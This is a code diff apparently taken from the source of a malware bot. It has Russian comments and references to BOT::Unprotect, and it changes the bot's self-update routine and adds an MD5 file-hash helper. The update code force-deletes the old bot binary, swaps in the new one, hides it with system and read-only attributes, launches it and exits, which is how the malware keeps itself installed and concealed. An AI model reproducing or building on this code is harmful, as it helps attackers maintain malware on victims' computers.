@@ -271,6 +271,24 @@ char *CalcFileMD5Hash(char *szFileName)
 }
 
 
+string CalcFileMD5Hash2(char *szFileName)
+{
+	string Hash;
+	char *FileData = NULL;
+
+	int Error = 0;
+	int Size = ReadWholeFile((char *)szFileName, &FileData, &Error);
+	if (Size)
+	{
+		Hash = CalcMd5SummForBuffer(FileData, Size);
+
+		// Из-под файла
+		MemFree(FileData);
+	}
+
+	return Hash;
+}
+
 
 //------------------------------------------------------------ 
 //гениратция нового уида
@@ -813,17 +831,28 @@ bool MakeUpdate(PCHAR FileName )
 	if (BotPath == NULL)
 		return false;
 
+
 	if (FileExistsA(BotPath))
 	{
 		BOT::Unprotect();
 		pSetFileAttributesA( BotPath, FILE_ATTRIBUTE_ARCHIVE );
-		pMoveFileExA( FileName, BotPath, MOVEFILE_REPLACE_EXISTING );
-		pSetFileAttributesA(BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
-		RunFileA(BotPath);
-		pExitProcess(1);
+
+		// Принудительно удаляем старый файл
+		while (1)
+		{
+			pDeleteFileA(BotPath);
+			if (!FileExistsA(BotPath)) break;
+            pSleep(100);
+        }
+
 	}
 
+	pMoveFileExA( FileName, BotPath, MOVEFILE_REPLACE_EXISTING );
+	pSetFileAttributesA(BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
+	RunFileA(BotPath);
+
 	STR::Free(BotPath);
+	pExitProcess(1);
 
 	return true;
 }
